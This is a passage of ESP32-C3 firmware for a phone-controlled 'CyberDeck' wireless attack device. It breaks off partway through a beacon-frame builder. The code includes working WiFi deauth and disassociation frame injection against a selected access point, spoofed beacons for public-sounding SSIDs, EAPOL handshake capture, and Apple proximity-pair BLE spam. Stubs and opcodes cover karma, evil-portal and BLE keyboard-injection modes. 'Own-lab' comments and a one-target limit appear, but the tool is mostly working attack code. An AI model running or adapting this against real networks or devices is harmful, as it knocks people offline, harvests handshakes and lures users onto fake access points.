// CyberDeck v2 â€” orchestrator C3 (milestone 2: BLE control layer)
//
// Adds the NimBLE control service so an Android phone (or nRF Connect for the broad test) drives
// the mode machine. The C3 is the single processing unit: radio + brains + BLE control.
//
// SINGLE-RADIO RULE: BLE control and WiFi cannot run at once on this C3. Boot state is IDLE
// (BLE up, WiFi off) â€” the phone connects here. Selecting any WiFi-group mode (incl. PASSIVE recon)
// tears BLE down, runs WiFi, and the UNO becomes the live surface; send STOP (0xFF) or press BOOT
// to come back to IDLE and reclaim BLE. The NimBLE<->WiFi handoff is the main thing to stress-test.
//
// BLE service (custom UUIDs below), bonded + passkey 123456:
//   CMD    (write, enc):   byte[0]=opcode, byte[1..]=params. 0xF0=CLOCK_SYNC(epoch u32 LE), 0xFF=STOP
//   STATUS (notify, enc):  short "mode + stat" string the app shows
//   DATA   (notify, enc):  reserved for pcap/wardrive dumps (next milestones)
//
// Libraries: NimBLE-Arduino 2.5.x (2.x API). Partition: use a scheme with >=1.9MB app (WiFi+BLE).
// Board: ESP32C3 Dev Module, "USB CDC On Boot: Enabled".
// Link:  C3 GPIO21 (Serial1 TX) -> UNO D0 (RX), common GND. 19200 baud.
// See docs/orchestration-plan.md for the full spec.

extern "C" {
  #include "esp_wifi.h"
  #include "esp_event.h"
  #include "esp_wifi_types.h"
  #include "nvs_flash.h"
}
#include <esp_netif.h>
#include <esp_wifi_default.h>
#include <esp_http_server.h>
#include <lwip/sockets.h>
#include <NimBLEDevice.h>
#include "ducky.h"

// ---------------------------------------------------------------------------------------
// Link + tunables
// ---------------------------------------------------------------------------------------
static const int      LINK_TX = 21, LINK_RX = 20;
static const uint32_t LINK_BAUD = 19200;
static const int      BOOT_BTN  = 9;        // BOOT/strapping pin, readable as input after boot
static const int      SCREEN_ROWS = 20, ROW_TEXT_MAX = 34;
static const uint32_t SEND_MS     = 400;    // stream rows to the UNO ~2.5x/sec
static const uint32_t FULLREFRESH_MS = 15000;
static const uint32_t HOP_MS      = 200;
static const uint32_t FORGET_MS   = 90000;
static const uint32_t STATUS_MS   = 1000;   // BLE STATUS notify cadence (non-WiFi modes)

// BLE identity / UUIDs
static const char* BLE_NAME   = "CyberDeck";
static const uint32_t BLE_PASSKEY = 123456;
static const char* HID_BAIT_NAME = "Wireless Keyboard";   // BLE_HID_TRAP advertised name
static const char* SVC_UUID   = "6e40a000-b5a3-f393-e0a9-e50e24dcca9e";
static const char* CMD_UUID   = "6e40a001-b5a3-f393-e0a9-e50e24dcca9e";
static const char* STAT_UUID  = "6e40a002-b5a3-f393-e0a9-e50e24dcca9e";
static const char* DATA_UUID  = "6e40a003-b5a3-f393-e0a9-e50e24dcca9e";

enum { COL_W = 0, COL_GRAY, COL_GREEN, COL_YELLOW, COL_RED, COL_CYAN, COL_ORANGE };

// Encryption classes
enum { ENC_OPEN = 0, ENC_WEP, ENC_WPA, ENC_WPA2, ENC_WPA3, ENC_WPA2_WPA3, ENC_ENT };
#define FLAG_HIDDEN 0x01
#define FLAG_RANDOM 0x02

// ---------------------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------------------
struct Ap  { bool used; uint8_t bssid[6]; int8_t rssi; uint8_t ch, enc, flags, ssidLen;
             char ssid[33]; uint32_t firstMs, lastMs; };
struct Cli { bool used; uint8_t mac[6], ap[6]; int8_t rssi; uint8_t ch, flags, probeLen;
             char probe[33]; bool haveAp; uint32_t firstMs, lastMs; };

typedef struct __attribute__((packed)) {
  uint8_t frame_ctrl[2], duration[2], addr1[6], addr2[6], addr3[6], seq_ctrl[2];
} wifi_mac_hdr_t;

static const int AP_MAX = 40, CLI_MAX = 80;
static Ap  apTab[AP_MAX];
static Cli cliTab[CLI_MAX];
static int apCount = 0, cliCount = 0;

static volatile uint32_t framesTotal = 0, deauthTotal = 0, mgmtTotal = 0;
static uint8_t  channels[] = {1,2,3,4,5,6,7,8,9,10,11,12,13};
static const int NUM_CH = sizeof(channels);
static uint8_t  curCh = 1;
static int      chIdx = 0;
static uint32_t g_cycles = 0;
static uint32_t g_epoch  = 0;   // phone-synced epoch base (CLOCK_SYNC)

// Handshake capture (EAPOL) â€” counted in the promiscuous callback, shown on the UNO / streamed.
static volatile uint32_t eapolCount = 0;
static uint8_t  eapolBssid[6];
static bool     eapolHave = false;
// WiFi injection counters (own-lab)
static uint32_t txTotal = 0;
static int      beaconIdx = 0;

// ---- Attack TARGET (safety) ----------------------------------------------------------
// Active WiFi attacks (deauth / targeted handshake / karma) only ever act on THIS one BSSID.
// If no target is set, deauth transmits NOTHING. Set over BLE with opcode 0x20; the app picks
// it from a scan list (0x21 scan -> 0x23 pull list) or the user types a BSSID in.
static uint8_t  g_tgtBssid[6] = {0};
static uint8_t  g_tgtCh = 0;
static char     g_tgtSsid[33] = "";
static bool     g_haveTarget = false;
static volatile bool g_pendingAplist = false;

// ---------------------------------------------------------------------------------------
// Mode machine (source of truth)
// ---------------------------------------------------------------------------------------
enum Mode {
  IDLE = 0,                         // BLE up, WiFi off â€” phone connects here
  PASSIVE,                          // WiFi promiscuous recon (working)
  // WiFi-radio group (BLE down while these run)
  WIFI_SCAN, WIFI_DEAUTH, BEACON_SPAM, PROBE_FLOOD, KARMA, HANDSHAKE_CAPTURE, EVIL_PORTAL,
  // BLE-radio group
  BLE_SCAN, AIRTAG_SCAN, FLIPPER_SCAN, SKIMMER_SCAN, BLE_SPAM, BLE_HID_TRAP,
  TARGET_SCAN,                      // brief WiFi scan to collect a target list, then auto-return
  MODE_COUNT
};
// Three mutually-exclusive radio roles on the single radio â€” defined before the first function so
// the Arduino auto-prototype for roleOf() can resolve the return type. CONTROL = our BLE GATT;
// WIFI = promiscuous/TX; HID = the BLE HID keyboard trap.
enum RadioRole { ROLE_CONTROL, ROLE_WIFI, ROLE_HID };
// BLE scanner classes — defined up here (not by the scanner code) so the auto-prototype for
// classifyBle()/bleScanStart() can resolve the type. Same gotcha as RadioRole above.
enum BleKind { BK_PLAIN = 0, BK_AIRTAG, BK_FLIPPER, BK_SKIMMER };
static const char* MODE_NAME[MODE_COUNT] = {
  "IDLE / CONNECT PHONE", "PASSIVE RECON",
  "WIFI SCAN", "WIFI DEAUTH", "BEACON SPAM", "PROBE FLOOD", "KARMA", "HANDSHAKE CAPTURE", "EVIL PORTAL",
  "BLE SCAN", "AIRTAG SCAN", "FLIPPER SCAN", "SKIMMER SCAN", "BLE SPAM", "BLE HID TRAP",
  "TARGET SCAN"
};
static bool isWifiMode(Mode m) { return m >= PASSIVE && m <= EVIL_PORTAL; }
static bool isTxMode(Mode m) {
  switch (m) { case WIFI_DEAUTH: case BEACON_SPAM: case PROBE_FLOOD: case KARMA:
               case EVIL_PORTAL: case BLE_SPAM: case BLE_HID_TRAP: return true; default: return false; }
}

// BOOT-button bench cycle (exercises the BLE<->WiFi handoff): IDLE -> PASSIVE -> BLE_SCAN -> BEACON_SPAM
static const Mode CYCLE[] = { IDLE, PASSIVE, BLE_SCAN, BEACON_SPAM };
static const int  CYCLE_N = sizeof(CYCLE) / sizeof(CYCLE[0]);
static int        cycleIdx = 0;

static Mode currentMode = IDLE;
static bool promiscOn = false;

// ---------------------------------------------------------------------------------------
// BLE state
// ---------------------------------------------------------------------------------------
static NimBLEServer*         bleSrv   = nullptr;
static NimBLECharacteristic* chStatus = nullptr;
static NimBLECharacteristic* chData   = nullptr;   // reserved for next milestone
static bool             bleUp          = false;
static bool             bleTearingDown = false;
static volatile bool    phoneConnected = false;
static volatile int     pendingOpcode  = -1;

static Mode opcodeToMode(uint8_t op) {
  switch (op) {
    case 0x00: return PASSIVE;           case 0x01: return WIFI_SCAN;
    case 0x02: return WIFI_DEAUTH;       case 0x03: return BEACON_SPAM;
    case 0x04: return PROBE_FLOOD;       case 0x05: return KARMA;
    case 0x06: return HANDSHAKE_CAPTURE; case 0x07: return EVIL_PORTAL;
    case 0x10: return BLE_SCAN;          case 0x11: return AIRTAG_SCAN;
    case 0x12: return FLIPPER_SCAN;      case 0x13: return SKIMMER_SCAN;
    case 0x14: return BLE_SPAM;          case 0x15: return BLE_HID_TRAP;
    case 0x21: return TARGET_SCAN;       // scan to collect a target list
    case 0xFF: return IDLE;              // STOP
    default:   return MODE_COUNT;        // unknown
  }
}

// ---------------------------------------------------------------------------------------
// Link helpers (to the UNO)
// ---------------------------------------------------------------------------------------
static char    shadow[SCREEN_ROWS][ROW_TEXT_MAX + 1];
static uint8_t shColor[SCREEN_ROWS];
static bool    forceAll = true;

static void linkClear() { Serial1.print("C\n"); delay(20); for (int i=0;i<SCREEN_ROWS;i++){ shadow[i][0]=0; shColor[i]=0xFF; } forceAll = true; }
static void linkLeds(bool green, bool red) { Serial1.printf("L%d%d\n", green ? 1 : 0, red ? 1 : 0); delay(5); }

static void setRow(int r, uint8_t color, const char* text) {
  char buf[ROW_TEXT_MAX + 1];
  snprintf(buf, sizeof(buf), "%.*s", ROW_TEXT_MAX, text);
  if (!forceAll && color == shColor[r] && strcmp(buf, shadow[r]) == 0) return;
  strcpy(shadow[r], buf); shColor[r] = color;
  Serial1.printf("R%02d%u%s\n", r, color, buf);
  delay(150);  // pace >1 full TFT row-draw so the UNO's 64-byte RX buffer never overflows
}

// ---------------------------------------------------------------------------------------
// Table upserts
// ---------------------------------------------------------------------------------------
static Ap* apUpsert(const uint8_t* bssid, bool* isNew) {
  int free = -1, oldest = 0;
  for (int i = 0; i < AP_MAX; i++) {
    if (!apTab[i].used) { if (free < 0) free = i; continue; }
    if (memcmp(apTab[i].bssid, bssid, 6) == 0) { *isNew = false; return &apTab[i]; }
    if (apTab[i].lastMs < apTab[oldest].lastMs || !apTab[oldest].used) oldest = i;
  }
  *isNew = true;
  int s = free >= 0 ? free : oldest;
  if (free >= 0) apCount++;
  memset(&apTab[s], 0, sizeof(Ap));
  apTab[s].used = true; memcpy(apTab[s].bssid, bssid, 6); apTab[s].firstMs = millis();
  return &apTab[s];
}
static Cli* cliUpsert(const uint8_t* mac, bool* isNew) {
  int free = -1, oldest = 0;
  for (int i = 0; i < CLI_MAX; i++) {
    if (!cliTab[i].used) { if (free < 0) free = i; continue; }
    if (memcmp(cliTab[i].mac, mac, 6) == 0) { *isNew = false; return &cliTab[i]; }
    if (cliTab[i].lastMs < cliTab[oldest].lastMs || !cliTab[oldest].used) oldest = i;
  }
  *isNew = true;
  int s = free >= 0 ? free : oldest;
  if (free >= 0) cliCount++;
  memset(&cliTab[s], 0, sizeof(Cli));
  cliTab[s].used = true; memcpy(cliTab[s].mac, mac, 6); cliTab[s].firstMs = millis();
  return &cliTab[s];
}
static bool isMulticast(const uint8_t* m) { return m[0] & 0x01; }

// ---------------------------------------------------------------------------------------
// 802.11 tagged-parameter parsing
// ---------------------------------------------------------------------------------------
static bool parseSSID(const uint8_t* body, int len, const uint8_t** ssid, uint8_t* out) {
  int i = 0;
  while (i + 2 <= len) {
    uint8_t tag = body[i], l = body[i + 1];
    if (i + 2 + l > len) break;
    if (tag == 0) { *ssid = &body[i + 2]; *out = l > 32 ? 32 : l; return true; }
    i += 2 + l;
  }
  return false;
}
static uint8_t parseDsChannel(const uint8_t* body, int len) {
  int i = 0;
  while (i + 2 <= len) {
    uint8_t tag = body[i], l = body[i + 1];
    if (i + 2 + l > len) break;
    if (tag == 3 && l == 1) return body[i + 2];
    i += 2 + l;
  }
  return 0;
}
static uint8_t parseEncryption(const uint8_t* body, int len, uint16_t cap) {
  if ((cap & 0x0010) == 0) return ENC_OPEN;
  bool rsn = false, wpa1 = false, sae = false, psk = false, ent = false;
  int i = 0;
  while (i + 2 <= len) {
    uint8_t tag = body[i], l = body[i + 1];
    if (i + 2 + l > len) break;
    int start = i + 2, end = i + 2 + l;
    if (tag == 48) {
      rsn = true;
      int off = start + 2 + 4;
      if (off + 2 <= end) { uint16_t pw = body[off] | (body[off+1] << 8); off += 2 + (int)pw * 4; }
      if (off + 2 <= end) {
        uint16_t akm = body[off] | (body[off+1] << 8); off += 2;
        for (uint16_t k = 0; k < akm && off + 4 <= end; k++, off += 4) {
          uint8_t t = body[off + 3];
          if (t == 8 || t == 9) sae = true;
          else if (t == 2 || t == 4 || t == 6) psk = true;
          else if (t == 1 || t == 3 || t == 5 || t == 11 || t == 12) ent = true;
        }
      }
    } else if (tag == 221 && l >= 4 && body[start]==0x00 && body[start+1]==0x50 &&
               body[start+2]==0xF2 && body[start+3]==0x01) { wpa1 = true; }
    i += 2 + l;
  }
  if (rsn) {
    if (ent && !psk && !sae) return ENC_ENT;
    if (sae && psk) return ENC_WPA2_WPA3;
    if (sae) return ENC_WPA3;
    return ENC_WPA2;
  }
  return wpa1 ? ENC_WPA : ENC_WEP;
}
static const char* encShort(uint8_t e) {
  switch (e) { case ENC_OPEN: return "OPEN"; case ENC_WEP: return "WEP"; case ENC_WPA: return "WPA";
    case ENC_WPA2: return "WPA2"; case ENC_WPA3: return "WPA3"; case ENC_WPA2_WPA3: return "WPA23";
    case ENC_ENT: return "ENT"; default: return "?"; }
}

// ---------------------------------------------------------------------------------------
// Promiscuous callback (WiFi task â€” keep cheap)
// ---------------------------------------------------------------------------------------
static void noteAp(const uint8_t* bssid, const uint8_t* ssid, uint8_t ssidLen, bool hidden,
                   int8_t rssi, uint8_t ch, uint8_t enc) {
  bool isNew; Ap* a = apUpsert(bssid, &isNew);
  a->rssi = rssi; a->ch = ch; a->enc = enc;
  a->flags = hidden ? FLAG_HIDDEN : 0;
  if (ssidLen) { memcpy(a->ssid, ssid, ssidLen); a->ssid[ssidLen] = 0; a->ssidLen = ssidLen; }
  a->lastMs = millis();
}
static void noteClient(const uint8_t* mac, const uint8_t* ap, const uint8_t* probe,
                       uint8_t probeLen, int8_t rssi, uint8_t ch) {
  if (isMulticast(mac)) return;
  bool isNew; Cli* c = cliUpsert(mac, &isNew);
  c->rssi = rssi; c->ch = ch;
  c->flags = (mac[0] & 0x02) ? FLAG_RANDOM : 0;
  if (ap) { memcpy(c->ap, ap, 6); c->haveAp = true; }
  if (probeLen) { memcpy(c->probe, probe, probeLen); c->probe[probeLen] = 0; c->probeLen = probeLen; }
  c->lastMs = millis();
}

static void onPacket(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
  const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
  const uint8_t* p = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  if (len < (int)sizeof(wifi_mac_hdr_t)) return;
  const wifi_mac_hdr_t* h = (const wifi_mac_hdr_t*)p;
  uint8_t tb = (h->frame_ctrl[0] >> 2) & 0x3, st = (h->frame_ctrl[0] >> 4) & 0xF;
  int8_t rssi = pkt->rx_ctrl.rssi; uint8_t ch = pkt->rx_ctrl.channel;
  framesTotal++;

  if (tb == 2) {  // data: learn station<->BSSID
    // EAPOL (4-way handshake) sniffing: LLC/SNAP ethertype 0x888E sits after the MAC header
    // (24 bytes, or 26 for QoS-data subtype 0x8) + 6-byte SNAP. Count frames + remember the AP.
    if (currentMode == HANDSHAKE_CAPTURE) {
      int hl = (st & 0x08) ? 26 : 24;
      if (len >= hl + 8 && p[hl + 6] == 0x88 && p[hl + 7] == 0x8E) {
        // If a target is set, only count that AP's handshake; else count any (listen-only).
        if (!g_haveTarget || memcmp(h->addr3, g_tgtBssid, 6) == 0) {
          eapolCount++; memcpy(eapolBssid, h->addr3, 6); eapolHave = true;
        }
      }
    }
    uint8_t toDs = h->frame_ctrl[1] & 0x01, fromDs = h->frame_ctrl[1] & 0x02;
    if (toDs && !fromDs)      noteClient(h->addr2, h->addr1, nullptr, 0, rssi, ch);
    else if (!toDs && fromDs) noteClient(h->addr1, h->addr2, nullptr, 0, rssi, ch);
    return;
  }
  if (tb != 0) return;
  mgmtTotal++;
  switch (st) {
    case 0xC: deauthTotal++; return;
    case 0xA: deauthTotal++; return;
    case 0x8: case 0x5: {  // beacon / probe response
      const uint8_t* fixed = p + sizeof(wifi_mac_hdr_t);
      const uint8_t* body = fixed + 12;
      int bl = len - (int)sizeof(wifi_mac_hdr_t) - 12;
      if (bl <= 0) return;
      uint16_t cap = fixed[10] | (fixed[11] << 8);
      const uint8_t* ssid = nullptr; uint8_t sl = 0;
      bool has = parseSSID(body, bl, &ssid, &sl);
      bool hidden = has && (sl == 0 || ssid[0] == 0);
      if (hidden) sl = 0;
      uint8_t dc = parseDsChannel(body, bl);
      noteAp(h->addr3, ssid, sl, hidden, rssi, dc ? dc : ch, parseEncryption(body, bl, cap));
      break;
    }
    case 0x4: {  // probe request
      const uint8_t* body = p + sizeof(wifi_mac_hdr_t);
      int bl = len - (int)sizeof(wifi_mac_hdr_t);
      const uint8_t* ssid = nullptr; uint8_t sl = 0;
      if (bl > 0) parseSSID(body, bl, &ssid, &sl);
      noteClient(h->addr2, nullptr, ssid, sl, rssi, ch);
      break;
    }
  }
}

// ---------------------------------------------------------------------------------------
// WiFi radio lifecycle
// ---------------------------------------------------------------------------------------
static bool wifiInited = false;
static void wifiInitOnce() {
  if (wifiInited) return;
  nvs_flash_init();
  esp_netif_init();
  esp_event_loop_create_default();
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_STA);
  wifiInited = true;
}
static void wifiStart() {               // claim the radio for WiFi (BLE must already be down)
  wifiInitOnce();
  esp_wifi_start();
  wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA };
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&onPacket);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(channels[0], WIFI_SECOND_CHAN_NONE);
  promiscOn = true;
}
static void wifiStop() {                // release the radio so BLE can come back
  if (!promiscOn) return;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  esp_wifi_stop();
  promiscOn = false;
}
static void hop() {
  if (!promiscOn) return;
  for (int t = 0; t < NUM_CH; t++) {
    chIdx = (chIdx + 1) % NUM_CH;
    if (esp_wifi_set_channel(channels[chIdx], WIFI_SECOND_CHAN_NONE) == ESP_OK) { curCh = channels[chIdx]; return; }
  }
}

// ---------------------------------------------------------------------------------------
// BLE lifecycle + callbacks
// ---------------------------------------------------------------------------------------
static void statusNotify(const char* s) {
  if (!bleUp || !phoneConnected || !chStatus) return;
  chStatus->setValue((const uint8_t*)s, strlen(s));
  chStatus->notify();
}

class ServerCB : public NimBLEServerCallbacks {
  void onConnect(NimBLEServer* s, NimBLEConnInfo& info) override {
    phoneConnected = true;
    // Relax the link so it tolerates missed events: 30-50ms interval, latency 4,
    // 6s supervision timeout. Default Android params drop too easily on this C3.
    s->updateConnParams(info.getConnHandle(), 24, 40, 4, 600);
  }
  void onDisconnect(NimBLEServer* s, NimBLEConnInfo& info, int reason) override {
    phoneConnected = false;
    if (!bleTearingDown) NimBLEDevice::startAdvertising();   // re-advertise unless we're handing off
  }
};
class CmdCB : public NimBLECharacteristicCallbacks {
  void onWrite(NimBLECharacteristic* c, NimBLEConnInfo& info) override {
    NimBLEAttValue v = c->getValue();
    if (v.length() < 1) return;
    uint8_t op = v[0];
    if (op == 0xF0) {                                        // CLOCK_SYNC: epoch u32 LE in bytes 1..4
      if (v.length() >= 5) g_epoch = (uint32_t)v[1] | ((uint32_t)v[2] << 8) |
                                     ((uint32_t)v[3] << 16) | ((uint32_t)v[4] << 24);
      return;
    }
    if (op == 0x15 && v.length() >= 2) g_duckyScript = v[1];  // HID trap: byte[1] = script index
    if (op == 0x20) {                                        // SET_TARGET: [1..6]=BSSID [7]=ch [8..]=SSID
      if (v.length() >= 8) {
        const uint8_t* d = v.data();
        memcpy(g_tgtBssid, d + 1, 6); g_tgtCh = d[7];
        int sl = (int)v.length() - 8; if (sl > 32) sl = 32;
        if (sl > 0) { memcpy(g_tgtSsid, d + 8, sl); g_tgtSsid[sl] = 0; } else g_tgtSsid[0] = 0;
        g_haveTarget = true;
      }
      return;
    }
    if (op == 0x22) { g_haveTarget = false; g_tgtSsid[0] = 0; return; }   // CLEAR_TARGET
    if (op == 0x23) { g_pendingAplist = true; return; }                  // SEND_APLIST (pull scan list)
    pendingOpcode = op;   // defer the actual transition to loop() (never touch the radio in a BLE cb)
  }
};

static void bleStart() {
  if (bleUp) return;
  NimBLEDevice::init(BLE_NAME);
  NimBLEDevice::setSecurityAuth(true, true, true);           // bonding + MITM + secure connections
  NimBLEDevice::setSecurityIOCap(BLE_HS_IO_DISPLAY_ONLY);    // we "display" the fixed passkey
  NimBLEDevice::setSecurityPasskey(BLE_PASSKEY);

  bleSrv = NimBLEDevice::createServer();
  bleSrv->setCallbacks(new ServerCB());
  NimBLEService* svc = bleSrv->createService(SVC_UUID);
  NimBLECharacteristic* cmd =
      svc->createCharacteristic(CMD_UUID, NIMBLE_PROPERTY::WRITE | NIMBLE_PROPERTY::WRITE_ENC);
  cmd->setCallbacks(new CmdCB());
  chStatus = svc->createCharacteristic(STAT_UUID,
      NIMBLE_PROPERTY::READ | NIMBLE_PROPERTY::NOTIFY | NIMBLE_PROPERTY::READ_ENC);
  chData = svc->createCharacteristic(DATA_UUID,
      NIMBLE_PROPERTY::READ | NIMBLE_PROPERTY::NOTIFY | NIMBLE_PROPERTY::READ_ENC);
  svc->start();

  NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
  adv->addServiceUUID(SVC_UUID);
  adv->enableScanResponse(true);
  adv->start();
  bleUp = true;
}
static void bleStop() {
  if (!bleUp) return;
  bleTearingDown = true;
  NimBLEDevice::deinit(true);     // frees the BT controller so WiFi can take the radio
  bleSrv = nullptr; chStatus = nullptr; chData = nullptr;
  bleUp = false; phoneConnected = false; bleTearingDown = false;
}
static void bleAdvNormal() {       // restore our own service advertising (after a BLE_SPAM run)
  if (!bleUp) return;
  NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
  adv->stop();
  adv->clearData();
  adv->addServiceUUID(SVC_UUID);
  adv->setName(BLE_NAME);
  adv->enableScanResponse(true);
  adv->start();
}

// ---------------------------------------------------------------------------------------
// BLE scanners  (ROLE_CONTROL sub-activity â€” the phone STAYS connected while these run)
//   BLE_SCAN=everything  AIRTAG_SCAN=Apple offline-finding  FLIPPER_SCAN=name"Flipper"
//   SKIMMER_SCAN=common serial-BT modules (HC-0x / AT-09 / MLT-BT05 / JDY ...)
// ---------------------------------------------------------------------------------------
struct BleDev { bool used; char key[18]; int8_t rssi; uint8_t kind; char name[16]; uint32_t lastMs; };
static const int BLE_MAX = 24;
static BleDev   bleTab[BLE_MAX];
static int      bleCount = 0;
static uint32_t bleSeen = 0;
static BleKind  bleFilter = BK_PLAIN;
static bool     bleScanning = false;

static bool ciContains(const char* hay, const char* needle) {
  size_t nl = strlen(needle);
  for (const char* q = hay; *q; q++) if (strncasecmp(q, needle, nl) == 0) return true;
  return false;
}
static bool payloadMfr(const std::vector<uint8_t>& pl, const uint8_t** out, int* outLen) {
  size_t i = 0;
  while (i + 1 < pl.size()) {
    uint8_t len = pl[i];
    if (len == 0 || i + 1 + len > pl.size()) break;
    if (pl[i + 1] == 0xFF && len >= 3) { *out = &pl[i + 2]; *outLen = len - 1; return true; }
    i += 1 + len;
  }
  return false;
}
static BleKind classifyBle(const NimBLEAdvertisedDevice* d, const char* name) {
  std::vector<uint8_t> pl = d->getPayload();
  const uint8_t* m; int ml;
  if (payloadMfr(pl, &m, &ml) && ml >= 3 && m[0] == 0x4C && m[1] == 0x00) {
    if (m[2] == 0x12) return BK_AIRTAG;                  // Apple offline-finding / AirTag
  }
  if (name[0]) {
    if (ciContains(name, "flipper")) return BK_FLIPPER;
    if (ciContains(name, "HC-05") || ciContains(name, "HC-06") || ciContains(name, "HC-03") ||
        ciContains(name, "AT-09") || ciContains(name, "MLT-BT05") || ciContains(name, "JDY") ||
        ciContains(name, "BT05")  || ciContains(name, "skim"))
      return BK_SKIMMER;
  }
  return BK_PLAIN;
}
static void bleOnAdv(const NimBLEAdvertisedDevice* d) {
  bleSeen++;
  char name[16] = {0};
  std::string nm = d->getName();
  if (!nm.empty()) snprintf(name, sizeof(name), "%s", nm.c_str());
  BleKind k = classifyBle(d, name);
  if (bleFilter != BK_PLAIN && k != bleFilter) return;
  char key[18]; snprintf(key, sizeof(key), "%s", d->getAddress().toString().c_str());
  int freeI = -1, oldest = 0;
  for (int i = 0; i < BLE_MAX; i++) {
    if (!bleTab[i].used) { if (freeI < 0) freeI = i; continue; }
    if (strcmp(bleTab[i].key, key) == 0) {
      bleTab[i].rssi = d->getRSSI(); bleTab[i].lastMs = millis();
      if (name[0]) snprintf(bleTab[i].name, sizeof(bleTab[i].name), "%s", name);
      return;
    }
    if (bleTab[i].lastMs < bleTab[oldest].lastMs) oldest = i;
  }
  int s = freeI >= 0 ? freeI : oldest;
  if (freeI >= 0) bleCount++;
  memset(&bleTab[s], 0, sizeof(BleDev));
  bleTab[s].used = true; bleTab[s].rssi = d->getRSSI(); bleTab[s].kind = k; bleTab[s].lastMs = millis();
  snprintf(bleTab[s].key, sizeof(bleTab[s].key), "%s", key);
  if (name[0]) snprintf(bleTab[s].name, sizeof(bleTab[s].name), "%s", name);
}
class ScanCB : public NimBLEScanCallbacks {
  void onResult(const NimBLEAdvertisedDevice* d) override { bleOnAdv(d); }
};
static ScanCB scanCb;
static void bleScanStart(BleKind f) {
  bleFilter = f; bleCount = 0; bleSeen = 0; memset(bleTab, 0, sizeof(bleTab));
  NimBLEScan* s = NimBLEDevice::getScan();
  s->setScanCallbacks(&scanCb, false);
  s->setActiveScan(true);
  s->setInterval(80); s->setWindow(50);
  s->start(0, false, true);                              // 0 = scan until stopped
  bleScanning = true;
}
static void bleScanStop() {
  if (!bleScanning) return;
  NimBLEDevice::getScan()->stop();
  bleScanning = false;
}

// ---------------------------------------------------------------------------------------
// BLE_SPAM  (Apple "proximity pair" popups â€” own-lab; keeps the phone's GATT link alive)
// ---------------------------------------------------------------------------------------
static bool     bleSpamOn = false;
static uint32_t lastSpam = 0;
static const uint8_t APPLE_MODELS[][2] = {
  {0x0e,0x20},{0x0a,0x20},{0x0c,0x0e},{0x11,0x20},{0x03,0x0a},{0x05,0x0b},{0x06,0x0a},{0x13,0x20}
};
static void bleSpamStart() { if (bleUp) NimBLEDevice::getAdvertising()->stop(); bleSpamOn = true; lastSpam = 0; }
static void bleSpamStop()  { bleSpamOn = false; bleAdvNormal(); }
static void bleSpamTick() {
  if (!bleSpamOn || !bleUp) return;
  uint32_t now = millis();
  if (now - lastSpam < 50) return;
  lastSpam = now;
  const uint8_t* mdl = APPLE_MODELS[random((int)(sizeof(APPLE_MODELS) / sizeof(APPLE_MODELS[0])))];
  uint8_t p[] = { 0x4C,0x00, 0x07,0x19, 0x07, mdl[0], mdl[1], 0x55,
                  (uint8_t)random(256),(uint8_t)random(256),(uint8_t)random(256),(uint8_t)random(256),
                  0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
  NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
  adv->stop();
  NimBLEAdvertisementData ad;
  ad.setManufacturerData(std::string((const char*)p, sizeof(p)));
  adv->setAdvertisementData(ad);
  adv->start();
}

// ---------------------------------------------------------------------------------------
// WiFi frame injection  (ROLE_WIFI, promiscuous on â€” OWN-LAB ONLY)
// ---------------------------------------------------------------------------------------
static const char* FAKE_SSIDS[] = {
  "FreeWiFi","Starbucks WiFi","xfinitywifi","ATT-Guest","Airport_Free",
  "CyberDeck-Lab","Pentest-Net","Hotel-Guest","Public-WiFi","Cafe-Net"
};
static const int FAKE_N = sizeof(FAKE_SSIDS) / sizeof(FAKE_SSIDS[0]);
static void randMac(uint8_t* m) { for (int i = 0; i < 6; i++) m[i] = random(256); m[0] = (m[0] & 0xFE) | 0x02; }

// SAFETY: deauth ONLY the one selected target BSSID, on its channel. No target => no transmit.
static void txDeauthTarget() {
  if (!g_haveTarget) return;
  esp_wifi_set_channel(g_tgtCh ? g_tgtCh : curCh, WIFI_SECOND_CHAN_NONE);
  uint8_t f[26] = { 0xC0,0x00, 0x00,0x00, 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
                    0,0,0,0,0,0, 0,0,0,0,0,0, 0x00,0x00, 0x07,0x00 };
  memcpy(f + 10, g_tgtBssid, 6);                          // src = target AP
  memcpy(f + 16, g_tgtBssid, 6);                          // bssid = target AP
  esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);
  f[0] = 0xA0;                                            // disassoc
  esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);
  txTotal += 2;
}
static void txBeaconSsid(const char* ssid, uint8_t ch) {
  uint8_t bssid[6]; randMac(bssid);
  uint8_t f[128]; int n = 0;
  uint8_t hdr[] = { 0x80,0x00, 0x00,0x00, 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF };
  memcpy(f + n, hdr, 10); n += 10;
  memcpy(f + n, bssid, 6); n += 6;
  memcpy(f + n, bssid, 6); n += 6;
  f[n++] = 0x00; f[n++] = 0x00;                           // seq
  memset(f + n, 0, 8); n += 8;                            // timestamp
  f[n++] = 0x64; f[n++] = 0x00;                           // beacon interval
  f[n++] = 0x01; f[n++] = 0x00;                           // cap (ESS)
  int sl = strlen(ssid); if (sl > 32) sl = 32;
  f[n++] = 0x00; f[n++] = (uint8_t)sl; memcpy(f + n, ssid, sl); n += sl;
  uint8_t rates[] = { 0x01,0x08,0x82,0x84,0x8b,0x96,0x24,0x30,0x48,0x6c };
  memcpy(f + n, rates, sizeof(rates)); n += sizeof(rates);
